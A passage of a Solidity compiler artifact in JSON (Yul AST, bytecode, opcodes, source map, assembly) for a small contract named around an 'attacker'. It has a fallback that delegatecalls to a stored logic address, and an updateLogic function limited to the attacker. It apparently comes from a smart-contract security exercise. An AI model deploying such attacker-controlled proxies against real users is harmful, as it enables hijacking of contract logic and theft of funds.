																	"src": "2433:3:1"
																},
																"nativeSrc": "2433:18:1",
																"nodeType": "YulFunctionCall",
																"src": "2433:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "2425:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "2425:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "2472:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "2472:9:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "2483:1:1",
																				"nodeType": "YulLiteral",
																				"src": "2483:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "2468:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "2468:3:1"
																		},
																		"nativeSrc": "2468:17:1",
																		"nodeType": "YulFunctionCall",
																		"src": "2468:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nativeSrc": "2491:4:1",
																				"nodeType": "YulIdentifier",
																				"src": "2491:4:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "2497:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "2497:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "2487:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "2487:3:1"
																		},
																		"nativeSrc": "2487:20:1",
																		"nodeType": "YulFunctionCall",
																		"src": "2487:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "2461:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "2461:6:1"
																},
																"nativeSrc": "2461:47:1",
																"nodeType": "YulFunctionCall",
																"src": "2461:47:1"
															},
															"nativeSrc": "2461:47:1",
															"nodeType": "YulExpressionStatement",
															"src": "2461:47:1"
														},
														{
															"nativeSrc": "2517:139:1",
															"nodeType": "YulAssignment",
															"src": "2517:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nativeSrc": "2651:4:1",
																		"nodeType": "YulIdentifier",
																		"src": "2651:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43_to_t_string_memory_ptr_fromStack",
																	"nativeSrc": "2525:124:1",
																	"nodeType": "YulIdentifier",
																	"src": "2525:124:1"
																},
																"nativeSrc": "2525:131:1",
																"nodeType": "YulFunctionCall",
																"src": "2525:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "2517:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "2517:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43__to_t_string_memory_ptr__fromStack_reversed",
												"nativeSrc": "2244:419:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "2395:9:1",
														"nodeType": "YulTypedName",
														"src": "2395:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "2410:4:1",
														"nodeType": "YulTypedName",
														"src": "2410:4:1",
														"type": ""
													}
												],
												"src": "2244:419:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43(memPtr) {\n\n        mstore(add(memPtr, 0), \"Only attacker\")\n\n    }\n\n    function abi_encode_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 13)\n        store_literal_in_memory_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260043610610037575f3560e01c806348eb76ee1461005e578063795e617e14610088578063e062bb05146100b05761003e565b3661003e57005b365f80375f80365f80545af43d5f803e805f811461005a573d5ff35b3d5ffd5b348015610069575f80fd5b506100726100da565b60405161007f9190610232565b60405180910390f35b348015610093575f80fd5b506100ae60048036038101906100a99190610279565b6100ff565b005b3480156100bb575f80fd5b506100c46101d0565b6040516100d19190610232565b60405180910390f35b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461018e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610185906102fe565b60405180910390fd5b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61021c826101f3565b9050919050565b61022c81610212565b82525050565b5f6020820190506102455f830184610223565b92915050565b5f80fd5b61025881610212565b8114610262575f80fd5b50565b5f813590506102738161024f565b92915050565b5f6020828403121561028e5761028d61024b565b5b5f61029b84828501610265565b91505092915050565b5f82825260208201905092915050565b7f4f6e6c792061747461636b6572000000000000000000000000000000000000005f82015250565b5f6102e8600d836102a4565b91506102f3826102b4565b602082019050919050565b5f6020820190508181035f830152610315816102dc565b905091905056fea2646970667358221220a34ae33db78f9eebfec9ad10c82be4b74ab10a52c5040f7ca54dde6791ca1c5264736f6c634300081a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x48EB76EE EQ PUSH2 0x5E JUMPI DUP1 PUSH4 0x795E617E EQ PUSH2 0x88 JUMPI DUP1 PUSH4 0xE062BB05 EQ PUSH2 0xB0 JUMPI PUSH2 0x3E JUMP JUMPDEST CALLDATASIZE PUSH2 0x3E JUMPI STOP JUMPDEST CALLDATASIZE PUSH0 DUP1 CALLDATACOPY PUSH0 DUP1 CALLDATASIZE PUSH0 DUP1 SLOAD GAS DELEGATECALL RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY DUP1 PUSH0 DUP2 EQ PUSH2 0x5A JUMPI RETURNDATASIZE PUSH0 RETURN JUMPDEST RETURNDATASIZE PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x69 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x72 PUSH2 0xDA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x7F SWAP2 SWAP1 PUSH2 0x232 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x93 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xAE PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x279 JUMP JUMPDEST PUSH2 0xFF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xBB JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0xC4 PUSH2 0x1D0 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD1 SWAP2 SWAP1 PUSH2 0x232 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x18E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x185 SWAP1 PUSH2 0x2FE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x21C DUP3 PUSH2 0x1F3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x22C DUP2 PUSH2 0x212 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x245 PUSH0 DUP4 ADD DUP5 PUSH2 0x223 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x258 DUP2 PUSH2 0x212 JUMP JUMPDEST DUP2 EQ PUSH2 0x262 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x273 DUP2 PUSH2 0x24F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x28E JUMPI PUSH2 0x28D PUSH2 0x24B JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x29B DUP5 DUP3 DUP6 ADD PUSH2 0x265 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C792061747461636B657200000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x2E8 PUSH1 0xD DUP4 PUSH2 0x2A4 JUMP JUMPDEST SWAP2 POP PUSH2 0x2F3 DUP3 PUSH2 0x2B4 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x315 DUP2 PUSH2 0x2DC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LOG3 BLOBBASEFEE 0xE3 RETURNDATASIZE 0xB7 DUP16 SWAP15 0xEB INVALID 0xC9 0xAD LT 0xC8 0x2B 0xE4 0xB7 BLOBBASEFEE 0xB1 EXP MSTORE 0xC5 DIV 0xF PUSH29 0xA54DDE6791CA1C5264736F6C634300081A003300000000000000000000 ",
							"sourceMap": "141:877:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;435:14;432:1;429;416:34;542:1;539;523:14;520:1;503:14;497:21;490:5;477:67;578:16;575:1;572;557:38;615:6;639:1;634:66;;;;749:16;746:1;739:27;634:66;669:16;666:1;659:27;207:23;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;802:179;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;177:24;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;207:23;;;;;;;;;;;;;:::o;802:179::-;882:8;;;;;;;;;;;868:22;;:10;:22;;;860:48;;;;;;;;;;;;:::i;:::-;;;;;;;;;930:8;918:9;;:20;;;;;;;;;;;;;;;;;;802:179;:::o;177:24::-;;;;;;;;;;;;:::o;7:126:1:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;674:117::-;783:1;780;773:12;920:122;993:24;1011:5;993:24;:::i;:::-;986:5;983:35;973:63;;1032:1;1029;1022:12;973:63;920:122;:::o;1048:139::-;1094:5;1132:6;1119:20;1110:29;;1148:33;1175:5;1148:33;:::i;:::-;1048:139;;;;:::o;1193:329::-;1252:6;1301:2;1289:9;1280:7;1276:23;1272:32;1269:119;;;1307:79;;:::i;:::-;1269:119;1427:1;1452:53;1497:7;1488:6;1477:9;1473:22;1452:53;:::i;:::-;1442:63;;1398:117;1193:329;;;;:::o;1528:169::-;1612:11;1646:6;1641:3;1634:19;1686:4;1681:3;1677:14;1662:29;;1528:169;;;;:::o;1703:163::-;1843:15;1839:1;1831:6;1827:14;1820:39;1703:163;:::o;1872:366::-;2014:3;2035:67;2099:2;2094:3;2035:67;:::i;:::-;2028:74;;2111:93;2200:3;2111:93;:::i;:::-;2229:2;2224:3;2220:12;2213:19;;1872:366;;;:::o;2244:419::-;2410:4;2448:2;2437:9;2433:18;2425:26;;2497:9;2491:4;2487:20;2483:1;2472:9;2468:17;2461:47;2525:131;2651:4;2525:131;:::i;:::-;2517:139;;2244:419;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "170000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"": "infinite",
								"attacker()": "2486",
								"sinkLogic()": "2527",
								"updateLogic(address)": "26884"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 141,
									"end": 1018,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 237,
									"end": 349,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 237,
									"end": 349,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 237,
									"end": 349,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 237,
									"end": 349,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 237,
									"end": 349,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 237,
									"end": 349,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 237,
									"end": 349,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 237,
									"end": 349,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 306,
									"end": 312,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 294,
									"end": 303,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 294,
									"end": 303,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 294,
									"end": 312,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 294,
									"end": 312,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 294,
									"end": 312,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 294,
									"end": 312,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 333,
									"end": 342,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 322,
									"end": 330,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 322,
									"end": 330,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 322,
									"end": 342,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 322,
									"end": 342,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 322,
									"end": 342,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 322,
									"end": 342,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 322,
									"end": 342,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 237,
									"end": 349,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 141,
									"end": 1018,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
